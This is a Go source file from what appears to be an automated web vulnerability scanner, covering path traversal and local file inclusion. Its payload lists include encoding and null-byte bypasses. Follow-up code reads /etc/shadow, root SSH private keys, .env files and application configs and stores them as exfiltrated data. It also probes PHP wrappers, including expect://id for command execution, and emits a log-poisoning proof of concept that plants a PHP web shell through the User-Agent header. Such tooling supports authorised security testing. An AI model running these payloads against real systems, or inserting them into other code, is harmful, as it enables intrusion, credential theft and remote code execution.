package probers

import (
	"context"
	"encoding/base64"
	"fmt"
	"net/url"
	"regexp"
	"strings"

	"github.com/borntobeyours/ouroboros/pkg/types"
)

// PathTraversalProber tests for path traversal / local file inclusion.
type PathTraversalProber struct{}

func (p *PathTraversalProber) Name() string { return "pathtraversal" }

func (p *PathTraversalProber) Probe(ctx context.Context, target types.Target, endpoints []types.Endpoint) []types.Finding {
	cfg := NewProberConfig(target)
	if currentClassified != nil {
		cfg.Classified = currentClassified
	}
	var findings []types.Finding

	findings = append(findings, p.testLFI(cfg, endpoints)...)
	findings = append(findings, p.testCommonLFIPaths(cfg)...)
	findings = append(findings, p.testPHPWrappers(cfg, endpoints)...)
	findings = append(findings, p.testLogPoisoning(cfg, endpoints)...)

	return findings
}

// testLFI tests endpoints with file/path-like parameters for LFI.
func (p *PathTraversalProber) testLFI(cfg *ProberConfig, endpoints []types.Endpoint) []types.Finding {
	var findings []types.Finding

	// Parameters that commonly accept file paths
	fileParams := []string{"file", "path", "page", "include", "template", "doc",
		"document", "folder", "root", "dir", "img", "image", "filename",
		"name", "lang", "language", "module", "view", "layout", "theme",
		"style", "stylesheet", "log", "config", "conf", "data", "content",
		"cat", "category", "action", "type", "read", "load", "download",
		"src", "source", "resource", "rsc"}

	// Traversal payloads — escalating from basic to bypass
	payloads := []struct {
		path   string
		desc   string
		bypass string
	}{
		{"../../../etc/passwd", "basic traversal", ""},
		{"....//....//....//etc/passwd", "double-dot bypass", "filter bypass"},
		{"..%2f..%2f..%2fetc%2fpasswd", "URL-encoded traversal", "encoding bypass"},
		{"..%252f..%252f..%252fetc%252fpasswd", "double URL-encoded", "double encoding bypass"},
		{"....%5c....%5c....%5cetc%5cpasswd", "backslash encoded", "OS bypass"},
		{"/etc/passwd", "absolute path", "no traversal needed"},
		// Null byte injection — terminates strings in C-based parsers
		{"../../../etc/passwd\x00.jpg", "null byte injection", "null byte bypass"},
		{"../../../etc/passwd\x00.png", "null byte with PNG ext", "null byte bypass"},
		// UTF-8 overlong encoding of '.' (0x2E → 0xC0 0xAE) — bypasses legacy normalizers
		{"\xc0\xae\xc0\xae/\xc0\xae\xc0\xae/\xc0\xae\xc0\xae/etc/passwd", "UTF-8 overlong encoding", "overlong encoding bypass"},
		// Backslash mixup for Windows paths
		{`..\..\..\windows\win.ini`, "Windows win.ini backslash", ""},
		{`../../../windows/win.ini`, "Windows win.ini forward slash", ""},
		{"../../../etc/shadow", "shadow file", ""},
		{"../../../proc/self/environ", "proc environ", ""},
		{"../../../proc/self/cmdline", "proc cmdline", ""},
		{"../../../Windows/System32/drivers/etc/hosts", "Windows hosts", ""},
	}

	// Linux file signatures for validation
	type fileSignature struct {
		path       string
		indicators []string
		severity   string
		desc       string
	}

	linuxFiles := []fileSignature{
		{"/etc/passwd", []string{"root:", "/bin/bash", "/bin/sh", "nobody:", "/sbin/nologin"}, "Critical",
			"Local File Inclusion — /etc/passwd readable. System user accounts exposed."},
		{"/etc/shadow", []string{"root:", "$6$", "$5$", "$y$"}, "Critical",
			"Local File Inclusion — /etc/shadow readable. Password hashes exposed, can be cracked offline."},
		{"/proc/self/environ", []string{"PATH=", "HOME=", "USER=", "SHELL=", "LANG="}, "Critical",
			"Local File Inclusion — /proc/self/environ readable. Environment variables (potentially secrets) exposed."},
		{"/proc/self/cmdline", []string{"python", "java", "node", "ruby", "php"}, "High",
			"Local File Inclusion — /proc/self/cmdline readable. Process command line exposed."},
	}

	windowsFiles := []fileSignature{
		{"/Windows/System32/drivers/etc/hosts", []string{"localhost", "127.0.0.1"}, "High",
			"Local File Inclusion — Windows hosts file readable."},
		{"/windows/win.ini", []string{"[fonts]", "[extensions]", "[mci extensions]"}, "High",
			"Local File Inclusion — Windows win.ini readable."},
	}

	tested := make(map[string]bool)

	for _, ep := range endpoints {
		if ep.HasCategory(types.CatStatic) {
			continue
		}

		for _, param := range ep.Parameters {
			lowerParam := strings.ToLower(param)
			isFileParam := false
			for _, fp := range fileParams {
				if lowerParam == fp {
					isFileParam = true
					break
				}
			}
			if !isFileParam {
				continue
			}

			path := extractPath(ep.URL)
			baseEndpoint := strings.Split(ep.URL, "?")[0]
			testKey := path + "|" + param
			if tested[testKey] {
				continue
			}
			tested[testKey] = true

			for _, payload := range payloads {
				fullURL := fmt.Sprintf("%s?%s=%s", baseEndpoint, param, url.QueryEscape(payload.path))
				status, _, respBody, err := cfg.DoRequest("GET", fullURL, nil, nil)
				if err != nil || status != 200 || len(respBody) < 10 {
					continue
				}

				// Skip HTML error pages
				if strings.Contains(respBody, "<!DOCTYPE") || strings.Contains(respBody, "<html") {
					lowerBody := strings.ToLower(respBody)
					if !strings.Contains(lowerBody, "root:") && !strings.Contains(lowerBody, "path=") {
						continue
					}
				}

				// Check against known file signatures
				allSigs := append(linuxFiles, windowsFiles...)
				for _, sig := range allSigs {
					if !strings.Contains(payload.path, sig.path[1:]) { // strip leading /
						continue
					}
					lowerBody := strings.ToLower(respBody)
					matched := false
					for _, indicator := range sig.indicators {
						if strings.Contains(lowerBody, strings.ToLower(indicator)) {
							matched = true
							break
						}
					}
					if !matched {
						continue
					}

					// PROVEN — we actually read the file!
					f := p.exploitLFI(cfg, baseEndpoint, param, payload.path, payload.desc, respBody, sig, payload.bypass)
					findings = append(findings, f)
					return findings // One proven LFI is critical enough
				}
			}
		}
	}

	return findings
}

// exploitLFI performs follow-up exploitation after confirming LFI.
func (p *PathTraversalProber) exploitLFI(cfg *ProberConfig, baseEndpoint, param, initialPayload, traversalType, initialResp string, sig struct {
	path       string
	indicators []string
	severity   string
	desc       string
}, bypassType string) types.Finding {

	// Phase 2: Try to read more sensitive files
	sensitiveFiles := []struct {
		path    string
		desc    string
		secrets []string
	}{
		{"../../../etc/passwd", "system users", []string{"root:"}},
		{"../../../etc/shadow", "password hashes", []string{"$6$", "$5$", "$y$"}},
		{"../../../proc/self/environ", "environment variables", []string{"PATH=", "SECRET", "KEY", "TOKEN", "PASSWORD"}},
		{"../../../proc/self/cmdline", "process command", []string{}},
		{"../../../etc/hostname", "hostname", []string{}},
		{"../../../etc/hosts", "hosts file", []string{"localhost"}},
		{"../../../etc/nginx/nginx.conf", "nginx config", []string{"server", "location"}},
		{"../../../etc/apache2/apache2.conf", "apache config", []string{"ServerRoot", "DocumentRoot"}},
		{"../../../var/log/auth.log", "auth logs", []string{"session", "sshd"}},
		{"../../../var/log/apache2/access.log", "apache access log", []string{"GET", "POST", "HTTP/1"}},
		{"../../../root/.bash_history", "root bash history", []string{}},
		{"../../../root/.ssh/id_rsa", "root SSH private key", []string{"BEGIN", "PRIVATE KEY"}},
		{"../../../home", "home directory listing", []string{}},
		// App-specific sensitive files
		{"../.env", "local .env", []string{"DB_", "API_", "SECRET", "KEY"}},
		{"../../../app/.env", "app .env", []string{"DB_", "API_", "SECRET"}},
		{"../../../var/www/html/.env", "webroot .env", []string{"DB_", "API_", "SECRET"}},
		{"../../../app/config/database.yml", "database config", []string{"adapter", "database", "password"}},
		{"../../../app/config/application.yml", "application config", []string{"secret", "key", "password"}},
		{"../../../config.php", "config.php", []string{"password", "db_", "secret"}},
		{"../../../wp-config.php", "WordPress config", []string{"DB_PASSWORD", "AUTH_KEY", "table_prefix"}},
		{"../../../settings.py", "Django settings", []string{"SECRET_KEY", "DATABASES", "PASSWORD"}},
		{"../../../application.yml", "Spring config", []string{"password", "datasource", "secret"}},
		{"../.git/config", "git config", []string{"[remote", "url", "fetch"}},
		{"../../../web.config", "IIS web.config", []string{"connectionString", "appSettings", "password"}},
		{"../../../C:/inetpub/logs/LogFiles", "IIS logs", []string{"GET", "POST"}},
		// PHP session files (for session inclusion)
		{"/tmp/sess_", "PHP session file", []string{"user", "auth", "token"}},
	}

	var exfiltrated []string
	var extractedSecrets []string

	for _, sf := range sensitiveFiles {
		fullURL := fmt.Sprintf("%s?%s=%s", baseEndpoint, param, url.QueryEscape(sf.path))
		status, _, respBody, err := cfg.DoRequest("GET", fullURL, nil, nil)
		if err != nil || status != 200 || len(respBody) < 5 {
			continue
		}

		// Validate it's actual file content, not error page
		if strings.Contains(respBody, "<!DOCTYPE") && !strings.Contains(strings.ToLower(respBody), "root:") {
			continue
		}

		exfiltrated = append(exfiltrated, fmt.Sprintf("=== %s ===\n%s", sf.path, maskSensitiveData(truncate(respBody, 500))))

		// Check for secrets in the response
		for _, secret := range sf.secrets {
			if strings.Contains(strings.ToLower(respBody), strings.ToLower(secret)) {
				extractedSecrets = append(extractedSecrets, fmt.Sprintf("%s contains '%s'", sf.path, secret))
			}
		}
	}

	// Build the finding
	title := fmt.Sprintf("Path Traversal → Local File Read — %s via %s", sig.path, param)
	if len(exfiltrated) > 3 {
		title = fmt.Sprintf("Path Traversal → %d Files Extracted via %s parameter", len(exfiltrated), param)
	}

	severity := sig.severity
	desc := sig.desc
	if len(exfiltrated) > 3 {
		severity = "Critical"
		desc += fmt.Sprintf(" Follow-up exploitation extracted %d additional files.", len(exfiltrated))
	}
	if len(extractedSecrets) > 0 {
		desc += fmt.Sprintf(" Secrets found: %s.", strings.Join(extractedSecrets, "; "))
	}

	evidence := fmt.Sprintf("Initial read (%s):\n%s\n\nTraversal type: %s",
		initialPayload, truncate(initialResp, 300), traversalType)
	if bypassType != "" {
		evidence += fmt.Sprintf("\nBypass: %s", bypassType)
	}
	evidence += fmt.Sprintf("\nTotal files extracted: %d", len(exfiltrated))

	poc := fmt.Sprintf("# Path traversal exploit:\ncurl \"%s?%s=%s\"\n",
		baseEndpoint, param, url.QueryEscape(initialPayload))
	poc += fmt.Sprintf("\n# Extract more files:\n")
	for _, sf := range sensitiveFiles[:5] {
		poc += fmt.Sprintf("curl \"%s?%s=%s\"\n", baseEndpoint, param, url.QueryEscape(sf.path))
	}

	f := MakeFinding(title, severity, desc, extractPath(baseEndpoint), "GET", "CWE-22", poc, evidence, "path_traversal", 0)
	if len(exfiltrated) > 0 {
		f.ExfiltratedData = strings.Join(exfiltrated, "\n\n")
	}
	return f
}

// testCommonLFIPaths tests common LFI-vulnerable URL patterns (no parameter needed).
func (p *PathTraversalProber) testCommonLFIPaths(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	// Common vulnerable URL patterns
	patterns := []struct {
		path     string
		payloads []string
	}{
		{"/download/", []string{"../../../etc/passwd", "....//....//etc/passwd"}},
		{"/read/", []string{"../../../etc/passwd"}},
		{"/file/", []string{"../../../etc/passwd"}},
		{"/view/", []string{"../../../etc/passwd"}},
		{"/include/", []string{"../../../etc/passwd"}},
		{"/static/", []string{"../../../etc/passwd"}},
		{"/assets/", []string{"../../../etc/passwd"}},
		{"/uploads/", []string{"../../../etc/passwd"}},
		{"/images/", []string{"../../../etc/passwd"}},
	}

	for _, pat := range patterns {
		for _, payload := range pat.payloads {
			testURL := cfg.BaseURL + pat.path + payload
			status, _, respBody, err := cfg.DoRequest("GET", testURL, nil, nil)
			if err != nil || status != 200 || len(respBody) < 10 {
				continue
			}

			lowerBody := strings.ToLower(respBody)
			if strings.Contains(lowerBody, "root:") && (strings.Contains(lowerBody, "/bin/bash") || strings.Contains(lowerBody, "/bin/sh") || strings.Contains(lowerBody, "nobody:")) {
				poc := fmt.Sprintf("curl \"%s\"", testURL)

				findings = append(findings, MakeFinding(
					fmt.Sprintf("Path Traversal via URL Path — %s", pat.path),
					"Critical",
					fmt.Sprintf("Direct path traversal in URL path %s allows reading system files. /etc/passwd content extracted.", pat.path),
					pat.path+payload,
					"GET",
					"CWE-22",
					poc,
					fmt.Sprintf("HTTP %d - /etc/passwd content:\n%s", status, truncate(respBody, 500)),
					"path_traversal",
					0,
				))
				findings[len(findings)-1].ExfiltratedData = truncate(respBody, 2000)
				return findings
			}
		}
	}

	return findings
}

// testPHPWrappers tests for LFI via PHP stream wrappers (php://filter, expect://).
// These allow base64-encoded file reads and potential RCE.
func (p *PathTraversalProber) testPHPWrappers(cfg *ProberConfig, endpoints []types.Endpoint) []types.Finding {
	var findings []types.Finding

	fileParams := []string{"file", "path", "page", "include", "template", "doc",
		"document", "folder", "root", "dir", "img", "image", "filename",
		"name", "lang", "language", "module", "view", "layout", "theme",
		"style", "stylesheet", "log", "config", "conf", "data", "content",
		"src", "source", "resource", "rsc"}

	wrappers := []struct {
		payload  string
		desc     string
		validate func(body string) bool
	}{
		{
			"php://filter/convert.base64-encode/resource=/etc/passwd",
			"PHP filter wrapper (base64) on /etc/passwd",
			func(body string) bool {
				body = strings.TrimSpace(body)
				decoded, err := base64.StdEncoding.DecodeString(body)
				if err != nil {
					re := regexp.MustCompile(`[A-Za-z0-9+/=]{100,}`)
					match := re.FindString(body)
					if match == "" {
						return false
					}
					decoded, err = base64.StdEncoding.DecodeString(match)
					if err != nil {
						return false
					}
				}
				dec := strings.ToLower(string(decoded))
				return strings.Contains(dec, "root:") || strings.Contains(dec, "/bin/")
			},
		},
		{
			"php://filter/read=convert.base64-encode/resource=index.php",
			"PHP filter wrapper (base64) on index.php",
			func(body string) bool {
				re := regexp.MustCompile(`[A-Za-z0-9+/=]{40,}`)
				match := re.FindString(body)
				if match == "" {
					return false
				}
				decoded, err := base64.StdEncoding.DecodeString(match)
				if err != nil {
					return false
				}
				dec := strings.ToLower(string(decoded))
				return strings.Contains(dec, "<?php") || strings.Contains(dec, "<?=")
			},
		},
		{
			"expect://id",
			"PHP expect wrapper (RCE)",
			func(body string) bool {
				return strings.Contains(body, "uid=") && strings.Contains(body, "gid=")
			},
		},
	}

	tested := make(map[string]bool)
	for _, ep := range endpoints {
		if ep.HasCategory(types.CatStatic) {
			continue
		}
		for _, param := range ep.Parameters {
			lowerParam := strings.ToLower(param)
			isFileParam := false
			for _, fp := range fileParams {
				if lowerParam == fp {
					isFileParam = true
					break
				}
			}
			if !isFileParam {
				continue
			}

			baseEndpoint := strings.Split(ep.URL, "?")[0]
			testKey := extractPath(ep.URL) + "|" + param + "|php"
			if tested[testKey] {
				continue
			}
			tested[testKey] = true

			for _, w := range wrappers {
				fullURL := fmt.Sprintf("%s?%s=%s", baseEndpoint, param, url.QueryEscape(w.payload))
				status, _, respBody, err := cfg.DoRequest("GET", fullURL, nil, nil)
				if err != nil || status != 200 || len(respBody) < 5 {
					continue
				}
				if !w.validate(respBody) {
					continue
				}

				poc := fmt.Sprintf(`curl "%s?%s=%s"`, baseEndpoint, param, url.QueryEscape(w.payload))
				findings = append(findings, MakeFinding(
					fmt.Sprintf("LFI via PHP Wrapper — %s", w.desc),
					"Critical",
					fmt.Sprintf("PHP stream wrapper injection via parameter '%s'. %s", param, w.desc),
					extractPath(baseEndpoint),
					"GET",
					"CWE-98",
					poc,
					fmt.Sprintf("HTTP %d - PHP wrapper response:\n%s", status, truncate(respBody, 500)),
					"path_traversal",
					0,
				))
				return findings
			}
		}
	}

	return findings
}

// testLogPoisoning detects whether log files are readable via LFI and whether the
// User-Agent appears in the log (prerequisite for log poisoning → RCE).
func (p *PathTraversalProber) testLogPoisoning(cfg *ProberConfig, endpoints []types.Endpoint) []types.Finding {
	var findings []types.Finding

	fileParams := []string{"file", "path", "page", "include", "template", "doc",
		"document", "folder", "root", "dir", "module", "view", "layout",
		"src", "source", "resource", "rsc", "log", "config", "conf"}

	logFiles := []struct {
		path       string
		desc       string
		indicators []string
	}{
		{"../../../var/log/apache2/access.log", "Apache access log", []string{"GET /", "HTTP/1.", "Mozilla"}},
		{"../../../var/log/apache2/error.log", "Apache error log", []string{"PHP", "Error", "Warning"}},
		{"../../../var/log/nginx/access.log", "Nginx access log", []string{"GET /", "HTTP/1.", "Mozilla"}},
		{"../../../var/log/nginx/error.log", "Nginx error log", []string{"error", "crit"}},
		{"../../../var/log/auth.log", "SSH auth log", []string{"sshd", "session", "Accepted"}},
		{"../../../proc/self/fd/1", "Process stdout", []string{}},
	}

	marker := "OuroborosLFI-Probe-1337"

	tested := make(map[string]bool)
	for _, ep := range endpoints {
		if ep.HasCategory(types.CatStatic) {
			continue
		}
		for _, param := range ep.Parameters {
			lowerParam := strings.ToLower(param)
			isFileParam := false
			for _, fp := range fileParams {
				if lowerParam == fp {
					isFileParam = true
					break
				}
			}
			if !isFileParam {
				continue
			}

			baseEndpoint := strings.Split(ep.URL, "?")[0]
			testKey := extractPath(ep.URL) + "|" + param + "|log"
			if tested[testKey] {
				continue
			}
			tested[testKey] = true

			// Poison the log: send our marker in User-Agent so it appears in access logs
			cfg.DoRequest("GET", ep.URL, nil, map[string]string{"User-Agent": marker}) //nolint

			for _, lf := range logFiles {
				fullURL := fmt.Sprintf("%s?%s=%s", baseEndpoint, param, url.QueryEscape(lf.path))
				status, _, respBody, err := cfg.DoRequest("GET", fullURL, nil, nil)
				if err != nil || status != 200 || len(respBody) < 10 {
					continue
				}

				lowerBody := strings.ToLower(respBody)
				hasIndicator := len(lf.indicators) == 0
				for _, ind := range lf.indicators {
					if strings.Contains(lowerBody, strings.ToLower(ind)) {
						hasIndicator = true
						break
					}
				}
				if !hasIndicator {
					continue
				}

				markerInLog := strings.Contains(respBody, marker)
				title := fmt.Sprintf("LFI — Log File Readable (%s)", lf.desc)
				severity := "High"
				desc := fmt.Sprintf("Log file '%s' is readable via path traversal in parameter '%s'.", lf.path, param)
				if markerInLog {
					title = fmt.Sprintf("LFI to RCE — Log Poisoning Possible (%s)", lf.desc)
					severity = "Critical"
					desc += " User-Agent appears in the log — attacker can inject PHP code via User-Agent then include the log to achieve RCE."
				}

				poc := "# Step 1: Poison the log with PHP payload in User-Agent:\n"
				poc += fmt.Sprintf("curl -H 'User-Agent: <?php system($_GET[\"cmd\"]); ?>' \"%s\"\n\n", ep.URL)
				poc += "# Step 2: Include the poisoned log:\n"
				poc += fmt.Sprintf("curl \"%s?%s=%s&cmd=id\"\n", baseEndpoint, param, url.QueryEscape(lf.path))

				f := MakeFinding(title, severity, desc, extractPath(baseEndpoint), "GET", "CWE-22", poc,
					fmt.Sprintf("HTTP %d - Log content:\n%s", status, truncate(respBody, 400)),
					"path_traversal", 0)
				if markerInLog {
					f.ExfiltratedData = fmt.Sprintf("Log poisoning confirmed: marker '%s' found in log", marker)
				}
				findings = append(findings, f)
				return findings
			}
		}
	}

	return findings
}

// maskSensitiveData redacts password hashes and private key bodies in file output.
func maskSensitiveData(s string) string {
	hashRe := regexp.MustCompile(`\$(6|5|y|2b|2a)\$[A-Za-z0-9./+]{10,}`)
	s = hashRe.ReplaceAllStringFunc(s, func(h string) string {
		if len(h) > 8 {
			return h[:8] + "***REDACTED***"
		}
		return "***REDACTED***"
	})
	pemRe := regexp.MustCompile(`(-----BEGIN [A-Z ]+-----)[A-Za-z0-9+/=\r\n]+(-----END [A-Z ]+-----)`)
	s = pemRe.ReplaceAllString(s, "$1\n***KEY BODY REDACTED***\n$2")
	return s
}
